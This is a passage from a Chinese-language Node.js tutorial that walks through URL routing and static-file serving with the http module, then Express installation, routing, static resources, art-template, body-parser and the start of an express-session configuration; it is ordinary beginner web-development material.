class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// console.log(req.url)</span>  <span class="token comment" spellcheck="true">// 127.0.0.1:3000/abc</span>  <span class="token comment" spellcheck="true">// 一切请求路径都始终是以 / 开头</span>  <span class="token comment" spellcheck="true">// / index page</span>  <span class="token comment" spellcheck="true">// /login login page</span>  <span class="token comment" spellcheck="true">// /about about me</span>  <span class="token comment" spellcheck="true">// 其它的 404 Not Found.</span>  <span class="token comment" spellcheck="true">// res.end('index page')</span>  <span class="token keyword">const</span> url <span class="token operator">=</span> req<span class="token punctuation">.</span>url  <span class="token comment" spellcheck="true">// 通常情况下，都会把 / 当作首页</span>  <span class="token comment" spellcheck="true">// 因为用户手动输入地址，不加任何路径，浏览器会自动补上 / 去请求</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'首页'</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;h1>首页&lt;/h1>&lt;ul>&lt;li>  &lt;a href="/login">登陆&lt;/a>&lt;/li>&lt;li>  &lt;a href="/reg">注册&lt;/a>&lt;/li>&lt;/ul>`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">===</span> <span class="token string">'/login'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'登陆'</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'login page'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">===</span> <span class="token string">'/reg'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'注册'</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'reg page'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'404 不认识'</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'404 Not Found.'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server is running at port 3000.'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="解决中文乱码问题"><a href="#解决中文乱码问题" class="headerlink" title="解决中文乱码问题"></a>解决中文乱码问题</h4><ul><li><code>Content-Type</code><ul><li>根据不同的内容类型所对应的数据也不一样，具体查询：<a href="http://tool.oschina.net/commons" target="_blank" rel="noopener">http://tool.oschina.net/commons</a></li></ul></li><li>html 文件中的 <code>&lt;meta charset="UTF-8" /&gt;</code><ul><li>html 文件需要如果声明了 meta-charset 则可以不写 Content-Type</li></ul></li><li>建议每个响应都告诉客户端我给你发送的 Content-Type 内容类型是什么</li></ul><h4 id="处理页面中的多个请求"><a href="#处理页面中的多个请求" class="headerlink" title="处理页面中的多个请求"></a>处理页面中的多个请求</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/** * http 结合 fs 发送文件内容 */</span><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> url <span class="token operator">=</span> req<span class="token punctuation">.</span>url  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./views/index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'404 Not Found.'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 响应数据类型只能是：字符串 和 二进制数据</span>      <span class="token comment" spellcheck="true">// TypeError: First argument must be a string or Buffer</span>      <span class="token comment" spellcheck="true">// res.end(123)</span>      res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html; charset=utf-8'</span><span class="token punctuation">)</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">===</span> <span class="token string">'/css/main.css'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./views/css/main.css'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'404 Not Found.'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 响应数据类型只能是：字符串 和 二进制数据</span>      <span class="token comment" spellcheck="true">// TypeError: First argument must be a string or Buffer</span>      <span class="token comment" spellcheck="true">// res.end(123)</span>      res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/css; charset=utf-8'</span><span class="token punctuation">)</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">===</span> <span class="token string">'/js/main.js'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./views/js/main.js'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'404 Not Found.'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 响应数据类型只能是：字符串 和 二进制数据</span>      <span class="token comment" spellcheck="true">// TypeError: First argument must be a string or Buffer</span>      <span class="token comment" spellcheck="true">// res.end(123)</span>      res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-javascript; charset=utf-8'</span><span class="token punctuation">)</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">===</span> <span class="token string">'/img/ab2.jpg'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./views/img/ab2.jpg'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'404 Not Found.'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 响应数据类型只能是：字符串 和 二进制数据</span>      <span class="token comment" spellcheck="true">// TypeError: First argument must be a string or Buffer</span>      <span class="token comment" spellcheck="true">// res.end(123)</span>      <span class="token comment" spellcheck="true">// 只有文本类型需要加 charset 编码</span>      <span class="token comment" spellcheck="true">// 图片不是文本，所以不用加编码</span>      res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'running...'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="统一处理静态资源"><a href="#统一处理静态资源" class="headerlink" title="统一处理静态资源"></a>统一处理静态资源</h4><h4 id="API-总结"><a href="#API-总结" class="headerlink" title="API 总结"></a>API 总结</h4><h6 id="请求对象-Request"><a href="#请求对象-Request" class="headerlink" title="请求对象 Request"></a>请求对象 Request</h6><ul><li>url</li><li>method</li></ul><h6 id="响应对象-Response"><a href="#响应对象-Response" class="headerlink" title="响应对象 Response"></a>响应对象 Response</h6><ul><li>write</li><li>end</li></ul><h4 id="留言本案例"><a href="#留言本案例" class="headerlink" title="留言本案例"></a>留言本案例</h4><ul><li>自己处理静态资源</li><li>处理表单提交<ul><li>列表查询</li><li>表单提交</li></ul></li></ul><h4 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h4><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><h2 id="第8章-使用-Express-快速进行-Web-开发"><a href="#第8章-使用-Express-快速进行-Web-开发" class="headerlink" title="第8章 使用 Express 快速进行 Web 开发"></a>第8章 使用 Express 快速进行 Web 开发</h2><p><strong>学习目标</strong></p><ul><li>掌握使用 Express 处理静态资源</li><li>理解路由概念</li><li>掌握 Express 路由的基本使用</li><li>理解模板引擎概念</li><li>掌握模板引擎的基本使用</li><li>理解 Express 中间件执行模型</li><li>案例：Express 重写留言本案例</li><li><strong>案例：基于文件的增删改查</strong><ul><li>JSON 数据</li></ul></li></ul><p>原生的 http 模块在某些方面表现不足以应对我们的开发需求，所以我们就需要使用框架来加快我们的开发效率，框架的目的就是提高效率，让我们的代码更统一。<br>在 Node 中，有很多 Web 开发框架，我们这里以学习 <code>Express</code> 为主。</p><h4 id="Express-介绍"><a href="#Express-介绍" class="headerlink" title="Express 介绍"></a>Express 介绍</h4><ul><li>Express 是一个基于 Node.js 平台，快速、开放、极简的 web 开发框架。</li></ul><ul><li>作者：<a href="https://github.com/tj" target="_blank" rel="noopener">tj</a><ul><li><a href="http://tjholowaychuk.com/" target="_blank" rel="noopener">tj 个人博客</a></li><li>知名的开源项目创建者和协作者</li><li>Express、commander、ejs、co、Koa…</li><li>已经离开 Node 社区，转 Go 了</li><li><a href="https://www.zhihu.com/question/24373004" target="_blank" rel="noopener">知乎 - 如何看待 TJ 宣布退出 Node.js 开发，转向 Go？</a></li></ul></li><li>丰富的 API 支持，强大而灵活的中间件特性</li><li>Express 不对 Node.js 已有的特性进行二次抽象，只是在它之上扩展了 Web 应用所需的基本功能</li><li>有很多<a href="http://expressjs.com/en/resources/frameworks.html" target="_blank" rel="noopener">流行框架</a>基于 Express</li></ul><ul><li><a href="http://expressjs.com/" target="_blank" rel="noopener">Express 官网</a></li><li><a href="http://www.expressjs.com.cn/" target="_blank" rel="noopener">Express 中文文档（非官方）</a></li><li><a href="https://github.com/expressjs/express" target="_blank" rel="noopener">Express GitHub仓库</a></li></ul><h4 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h4><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><blockquote><p>参考文档：<a href="http://expressjs.com/en/starter/installing.html" target="_blank" rel="noopener">http://expressjs.com/en/starter/installing.html</a></p></blockquote><pre class=" language-shell"><code class="language-shell">## 创建并切换到 myapp 目录mkdir myappcd myapp## 初始化 package.json 文件npm init -y## 安装 express 到项目中npm i express</code></pre><h6 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h6><blockquote><p>参考文档：<a href="http://expressjs.com/en/starter/hello-world.html" target="_blank" rel="noopener">http://expressjs.com/en/starter/hello-world.html</a></p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 0. 加载 Express</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1. 调用 express() 得到一个 app</span><span class="token comment" spellcheck="true">//    类似于 http.createServer()</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 设置请求对应的处理函数</span><span class="token comment" spellcheck="true">//    当客户端以 GET 方法请求 / 的时候就会调用第二个参数：请求处理函数</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 监听端口号，启动 Web 服务</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'app listening on port 3000!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h6 id="基本路由"><a href="#基本路由" class="headerlink" title="基本路由"></a>基本路由</h6><blockquote><p>参考文档：<a href="http://expressjs.com/en/starter/basic-routing.html" target="_blank" rel="noopener">http://expressjs.com/en/starter/basic-routing.html</a></p></blockquote><p>路由（Routing）是由一个 URI（或者叫路径标识）和一个特定的 HTTP 方法（GET、POST 等）组成的，涉及到应用如何处理响应客户端请求。</p><p>每一个路由都可以有一个或者多个处理器函数，当匹配到路由时，这个/些函数将被执行。</p><p>路由的定义的结构如下：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">METHOD</span><span class="token punctuation">(</span>PATH<span class="token punctuation">,</span> HANDLER<span class="token punctuation">)</span></code></pre><p>其中：</p><ul><li><code>app</code> 是 express 实例</li><li><code>METHOD</code> 是一个 <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol##Request_methods" target="_blank" rel="noopener">HTTP 请求方法</a></li><li><code>PATH</code> 是服务端路径（定位标识）</li><li><code>HANDLER</code> 是当路由匹配到时需要执行的处理函数</li></ul><p>下面是一些基本示例。</p><p>Respond with <code>Hello World!</code> on the homepage:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 当你以 GET 方法请求 / 的时候，执行对应的处理函数</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>Respond to POST request on the root route (<code>/</code>), the application’s home page:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 当你以 POST 方法请求 / 的时候，指定对应的处理函数</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Got a POST request'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>Respond to a PUT request to the <code>/user</code> route:</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Got a PUT request at /user'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>Respond to a DELETE request to the <code>/user</code> route:</p><pre class=" language-typescript"><code class="language-typescript">app<span class="token punctuation">.</span><span class="token keyword">delete</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Got a DELETE request at /user'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>For more details about routing, see the <a href="http://expressjs.com/en/guide/routing.html" target="_blank" rel="noopener">routing guide</a>.</p><h4 id="处理静态资源"><a href="#处理静态资源" class="headerlink" title="处理静态资源"></a>处理静态资源</h4><blockquote><p>参考文档：<a href="http://expressjs.com/en/starter/static-files.html" target="_blank" rel="noopener">http://expressjs.com/en/starter/static-files.html</a></p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 开放 public 目录中的资源</span><span class="token comment" spellcheck="true">// 不需要访问前缀</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 开放 files 目录资源，同上</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 开放 public 目录，限制访问前缀</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/public'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 开放 public 目录资源，限制访问前缀</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 开放 publi 目录，限制访问前缀</span><span class="token comment" spellcheck="true">// path.join(__dirname, 'public') 会得到一个动态的绝对路径</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="使用模板引擎"><a href="#使用模板引擎" class="headerlink" title="使用模板引擎"></a>使用模板引擎</h4><blockquote><p>参考文档：</p><ul><li><a href="http://expressjs.com/en/guide/using-template-engines.html" target="_blank" rel="noopener">Using template engines with Express</a></li></ul></blockquote><p>我们可以使用模板引擎处理服务端渲染，但是 Express 为了保持其极简灵活的特性并没有提供类似的功能。</p><p>同样的，Express 也是开放的，它支持开发人员根据自己的需求将模板引擎和 Express 结合实现服务端渲染的能力。</p><h6 id="配置使用-art-template-模板引擎"><a href="#配置使用-art-template-模板引擎" class="headerlink" title="配置使用 art-template 模板引擎"></a>配置使用 art-template 模板引擎</h6><blockquote><p>参考文档：</p><ul><li><a href="https://aui.github.io/art-template/" target="_blank" rel="noopener">art-template 官方文档</a></li></ul></blockquote><p>这里我们以 <a href="https://github.com/aui/art-template" target="_blank" rel="noopener">art-template</a> 模板引擎为例演示如何和 Express 结合使用。</p><p>安装：</p><pre class=" language-shell"><code class="language-shell">npm install art-template express-art-template</code></pre><p>配置：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 第一个参数用来配置视图的后缀名，这里是 art ，则你存储在 views 目录中的模板文件必须是 xxx.art</span><span class="token comment" spellcheck="true">// app.engine('art', require('express-art-template'))</span><span class="token comment" spellcheck="true">// 这里我把 art 改为 html</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>使用示例：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// render 方法默认会去项目的 views 目录中查找 index.html 文件</span>  <span class="token comment" spellcheck="true">// render 方法的本质就是将读取文件和模板引擎渲染这件事儿给封装起来了</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token string">'hello world'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>如果希望修改默认的 <code>views</code> 视图渲染存储目录，可以：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 第一个参数 views 是一个特定标识，不能乱写</span><span class="token comment" spellcheck="true">// 第二个参数给定一个目录路径作为默认的视图查找目录</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> 目录路径<span class="token punctuation">)</span></code></pre><h6 id="其它常见模板引擎"><a href="#其它常见模板引擎" class="headerlink" title="其它常见模板引擎"></a>其它常见模板引擎</h6><p>JavaScript 模板引擎有很多，并且他们的功能都大抵相同，但是不同的模板引擎也各有自己的特色。</p><p>大部分 JavaScript 模板引擎都可以在 Node 中使用，下面是一些常见的模板引擎。</p><ul><li>ejs</li><li>handlebars</li><li>jade<ul><li>后改名为 pug</li></ul></li><li>nunjucks</li></ul><h4 id="解析表单-post-请求体"><a href="#解析表单-post-请求体" class="headerlink" title="解析表单 post 请求体"></a>解析表单 post 请求体</h4><blockquote><p>参考文档：</p><ul><li><a href="https://github.com/expressjs/body-parser" target="_blank" rel="noopener">GitHub - body-parser</a></li></ul></blockquote><p>在 Express 中没有内置获取表单 POST 请求体的 API，这里我们需要使用一个第三方包：<code>body-parser</code>。</p><p>安装：</p><pre class=" language-shell"><code class="language-shell">npm install --save body-parser</code></pre><p>配置：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 0. 引包</span><span class="token keyword">var</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 配置 body-parser</span><span class="token comment" spellcheck="true">// 只要加入这个配置，则在 req 请求对象上会多出来一个属性：body</span><span class="token comment" spellcheck="true">// 也就是说你就可以直接通过 req.body 来获取表单 POST 请求体数据了</span><span class="token comment" spellcheck="true">// parse application/x-www-form-urlencoded</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// parse application/json</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>使用：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'you posted:\n'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 可以通过 req.body 来获取表单 POST 请求体数据</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="使用-Session"><a href="#使用-Session" class="headerlink" title="使用 Session"></a>使用 Session</h4><blockquote><p>参考文档：<a href="https://github.com/expressjs/session" target="_blank" rel="noopener">https://github.com/expressjs/session</a></p></blockquote><p>安装：</p><pre class=" language-shell"><code class="language-shell">npm install express-session</code></pre><p>配置：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 该插件会为 req 请求对象添加一个成员：req.session 默认是一个对象</span><span class="token comment" spellcheck="true">// 这是最简单的配置方式，暂且先不用关心里面参数的含义</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 